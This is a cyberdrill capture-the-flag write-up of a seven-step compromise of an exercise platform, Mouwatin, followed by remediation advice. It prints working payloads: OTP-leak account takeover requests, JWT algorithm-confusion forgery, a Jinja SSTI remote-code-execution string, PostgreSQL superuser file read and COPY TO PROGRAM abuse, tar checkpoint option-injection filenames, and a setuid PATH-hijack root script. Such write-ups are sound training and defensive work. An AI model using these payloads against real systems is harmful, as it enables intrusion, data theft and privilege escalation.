# DGSSI CYBERDRILL 2026 WRITEUP

---

## 1. Summary

The Mouwatin platform was compromised end-to-end from an unauthenticated internet-facing
position to full root on the Linux application host. Five milestone flags were captured:

| # | Milestone | Flag |
| --- | --- | --- |
| 1 | Flag leaked by the public registry API | `flag_d4646c6a_a576_4b03_84bf_784bf540b517` |
| 2 | Web application container | `flag_12071765_5b1e_4518_baf5_f2cf2547fdc5` |
| 3 | Database container | `flag_a50def27_da12_421e_96a1_fec1a0edefc0` |
| 4 | Host / archive service (svc-archive) | `flag_4b79a60a_f8aa_4f8c_9dd5_4a477f666957` |
| 5 | Linux administrator proof (root) | `flag_7209cce7_9a76_432e_8481_421f2835dd5e` |

The chain required chaining **seven** distinct weaknesses:

1. **Sensitive-data exposure :** the public registry API injects the milestone flag into
every one of the 500 citizen records (`app.py` reads `FLAG1_PATH`).
2. **Broken recovery flow** **:** the SMS OTP is returned in the HTTP response body, enabling
account takeover of any citizen.
3. **JWT RS256 → HS256 algorithm confusion** **:** tokens are HMAC-signed with the *public* key
PEM, so an attacker who knows the public key can forge tokens.
4. **Client-controlled authorization** **:** the `role` claim is trusted from the JWT.
5. **Server-Side Template Injection (SSTI)** **:** a complaint description is concatenated into
`render_template_string()`, giving RCE in the web container.
6. **PostgreSQL `pg_read_file` / `COPY … TO PROGRAM`** **:** the app DB role is a superuser,
giving arbitrary file read and command execution in the DB container.
7. **GNU tar wildcard option-injection** → **setuid PATH hijack** **:** a host archive job runs
`tar … *` in a world-writable directory, and a setuid-root helper calls
`system("review-status")` with a relative path, yielding root.

---

## 2. Scope & Environment

| Role | Host | Notes |
| --- | --- | --- |
| Kali | `13.51.237.143` (`itsutsu`) |  |
| Web / app host | `176.16.17.5` (`web1.ad.mouwatin.internal`, “vanadzor”) | ports 22, 80, 8080 |
| Workstation | `176.16.17.6` (`MOUW-WS01`, “gyumri”) | WinRM 5985, AD-joined |
| Domain controller | `176.16.17.4` (`MOUW-DC01`, “yerevan”) | AD `ad.mouwatin.internal` |

The web application is a Flask app (Gunicorn) backed by PostgreSQL 17.6, deployed with
Docker. The web and DB containers share a bind-mount of the host directory
`/srv/mouwatin/incoming` (mode 777).

---

## 3. Reconnaissance

```bash
# From the Kali box
nmap -Pn -sV -p- 176.16.17.5 -T4 -oN nmap_web.txt
# 22/tcp   ssh
# 80/tcp   http   -> redirects to the portal
# 8080/tcp http   -> Flask/Gunicorn

curl -s http://176.16.17.5/api/auth/metadata
# {"algorithms":["RS256","HS256"], ...}   <-- algorithm confusion is enabled

curl -s http://176.16.17.5/.well-known/jwks.json
# kid: mouwatin-access-01
curl -s http://176.16.17.5/api/auth/keys/access.pub   # RSA-2048 public key
```

Enumeration of the frontend JS (`app.js`) exposed the API surface:

- `/api/v1/registry?scope=all`
- `/api/auth/login`, `/api/auth/recovery/{request,confirm}`
- `/api/auth/device/legacy-activate`
- `/api/complaints` (citizen) and `/api/staff/complaints/<id>/export` (staff)

---

## 4. Attack Chain (stage by stage)

### Stage 0 - Flag 1 : public registry data exposure

```
GET /api/v1/registry?scope=all
```

Every one of the 500 citizen records contains a `flag` field. The application reads the
milestone flag file (`FLAG1_PATH=/run/flags/local1.txt`) and injects its contents into each
registry record. No authentication is required.

> **Flag 1:** `flag_d4646c6a_a576_4b03_84bf_784bf540b517` (source `/run/flags/local1.txt`)
> 

### Stage 1 - Citizen account takeover (broken recovery)

```
POST /api/auth/recovery/request  {"cin":"<from registry>","phone":"<from registry>"}
  -> {"challenge_id":"...","delivery":{"code":"<OTP>"}}   # OTP returned to the caller!
  
POST /api/auth/recovery/confirm  {"challenge_id":"...","otp":"<delivery.code>","new_password":"..."}

POST /api/auth/login             {"cin":"...","password":"..."}    -> {"pending_id":"..."}

POST /api/auth/device/legacy-activate {"pending_id":"...","device_id":"TERM-001"} -> {"access_token":"<JWT>"}
```

Because the recovery API echoes the SMS OTP in its own response, any citizen account can be
reset without owning the phone.

### Stage 2 - JWT RS256 → HS256 algorithm confusion + role escalation

`app.py` (lines ~107–113) accepts `HS256` and computes the HMAC using the **public key PEM
bytes** as the secret. Since `access.pub` is public, an attacker can forge tokens. The
`role` claim is trusted directly (`require("staff")`), so re-signing the legitimate session
token with `"role":"staff"` grants staff access.

```python
hdr = {"typ":"JWT","alg":"HS256","kid":"mouwatin-access-01"}
sig = HMAC-SHA256(key=access.pub_bytes, msg=header_b64 + "." + payload_b64)
```

`GET /api/me` then returns `role: staff`.

### Stage 3 - SSTI → RCE in the web container (Flag 2)

`app.py` line ~404:

```python
return render_template_string(frame + item["description"] + "</div>...</html>")
```

A complaint description is concatenated into the template **source**. Submit a complaint
with a Jinja payload and then request the staff export:

```
POST /api/complaints  {"category":"Autre","subject":"src","description":"{{7*7}}"}   # -> renders 49
# then:
GET /api/staff/complaints/<reference>/export
```

RCE payload used:

```
{{config.__class__.__init__.__globals__['os'].popen('cat /run/flags/*.txt').read()}}
```

Command execution confirmed as user `portal` (uid 10001), working dir `/srv/app`,
hostname `77c8f0ca9753`. The web container mounts `/run/flags/local1.txt` and
`/run/flags/local2.txt`.

> **Flag 2:** `flag_12071765_5b1e_4518_baf5_f2cf2547fdc5` (source `/run/flags/local2.txt`)
> 

### Stage 4 - Pivot to the database container (Flag 3)

The web container’s environment disclosed the DB credentials:

```
DB_HOST=db  DB_NAME=mouwatin  DB_USER=mouwatin_admin
POSTGRES_PASSWORD=68af3b77eeffa57cffc9aa557ef2d8c75a5c76a3dcd165e0
```

`db` resolves to `172.18.0.2` on the Docker network, and `mouwatin_admin` is a **superuser**
(`rolsuper=True`). From the web-container RCE:

```sql
PGPASSWORD='68af3b77eeffa57cffc9aa557ef2d8c75a5c76a3dcd165e0' \
psql -h db -U mouwatin_admin -d mouwatin -c "SELECT pg_read_file('/run/flags/local3.txt',0,200);"
```

The DB container mounts only `local3.txt` (the web container mounts `local1/2`), confirming
it is the DB container’s own flag. The same superuser can also achieve command execution via
`COPY (SELECT 1) TO PROGRAM '<shell command>'`. This last is a separate Postgres superuser feature that pipes query output into an arbitrary OS command, i.e. full **command execution**, not just file read.

> **Flag 3:** `flag_a50def27_da12_421e_96a1_fec1a0edefc0` (source `/run/flags/local3.txt`)
> 

### Stage 5 - Container → host (svc-archive) via tar wildcard injection (Flag 4)

The DB container bind-mounts the host directory `/srv/mouwatin/incoming` at
`/var/lib/postgresql/incoming` (mode **777**). A host systemd timer
(`mouwatin-archive.timer`, ~2-minute cycle) runs, as `svc-archive` (uid 997):

```bash
tar czf intake-<ts>.tgz *
```

The final argument introduces a critical security weakness.

The `*` wildcard is expanded by the shell before GNU tar processes the command.

For example, if the directory contains:

```
document.txt
report.csv
backup.log
```

The shell expands the command into something equivalent to:

```bash
tar czf intake-<ts>.tgz document.txt report.csv backup.log
```

The problem arises when filenames begin with characters that GNU tar interprets as command-line options.

For example:

```
--checkpoint=1
--checkpoint-action=exec=sh x
```

Rather than treating these values as ordinary filenames, GNU tar can interpret them as additional options.

A wildcard in a writable directory is a classic GNU tar option-injection sink. Using the
Postgres RCE (running as `postgres`, which can write into the shared dir), we dropped:

- `-checkpoint=1` (empty file → becomes a tar option)
- `-checkpoint-action=exec=sh x` (empty file → becomes a tar option)
- `x` (a shell script containing our commands)

When the timer fired, tar parsed the two `--…` filenames as options and executed
`sh x` **as svc-archive (uid 997)** on the host. Host enumeration (via `x`) revealed:

- `/usr/local/bin/archive-review` - a **setuid-root** ELF that runs
`setgid(0); setuid(0); system("review-status")`.
- `/home/local1.txt … /home/local4.txt` (uid 55555, mode 644).
- Docker socket is `root:docker 660`; svc-archive is **not** in the `docker` group (ruled out).

> **Flag 4:** `flag_4b79a60a_f8aa_4f8c_9dd5_4a477f666957` (source `/home/local4.txt`)
> 

### Stage 6 - svc-archive → root via setuid PATH hijack (Flag 5)

`/usr/local/bin/archive-review` is setuid-root (`-rwsr-xr-x root root`, 16048 bytes) and does `setgid(0); setuid(0); system("review-status")` - a **bare, relative** name. `system()` resolves it through the caller's `PATH`.

**The exploit:** we plant a fake `review-status` and put its dir first in PATH, then run the setuid binary:

```bash
#!/bin/sh
export PATH="/srv/mouwatin/incoming:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
cat > /srv/mouwatin/incoming/review-status <<'EOS'
#!/bin/sh
{ id; cat /root/proof.txt; } > /srv/mouwatin/incoming/ROOT.txt 2>&1
chmod 644 /srv/mouwatin/incoming/ROOT.txt
EOS
chmod 755 /srv/mouwatin/incoming/review-status
/usr/local/bin/archive-review
```

Confirmed root context: `uid=0(root) gid=0(root) groups=0(root),986(svc-archive)`.

**Flag 5:** `flag_7209cce7_9a76_432e_8481_421f2835dd5e` from `/root/proof.txt` (`-r-------- root root`).

**The one detail that unblocked it:** the injected script runs on the **host**, so PATH must point at `/srv/mouwatin/incoming` not the container view `/var/lib/postgresql/incoming`. With the container path the real `/usr/local/bin/review-status` won and the hijack silently failed.

---

## 5. Remediation

**Application layer**

- Do not embed milestone/secret values in API responses; remove `FLAG1_PATH` injection.
- Never return the OTP in the recovery response; bind recovery to a verified channel.
- Pin the JWT algorithm to `RS256`; never HMAC with an asymmetric public key.
- Read authorization from the server-side session/DB, not the client JWT claim.
- Render user content as **data** (`render_template` with variables), never concatenate it
into `render_template_string`.

**Database layer**

- Use a least-privilege app role (no `SUPERUSER`/`CREATEROLE`/`BYPASSRLS`).
- Disable/restrict `pg_read_server_files` and `COPY … TO/FROM PROGRAM`.
- Do not store DB credentials where web-container code execution can read them.

**Host layer**

- Remove or de-privilege the setuid `archive-review`; call helpers by **absolute path** or
`execve`, never a bare `system("review-status")`.
- Fix the archive job: never use a glob wildcard in a writable directory; use `-` and
absolute paths, or a manifest.
- Never bind-mount a world-writable directory into the DB container.
- Rotate `access.key` and all credentials; review the `ubuntu NOPASSWD:ALL` sudoers entry.
  
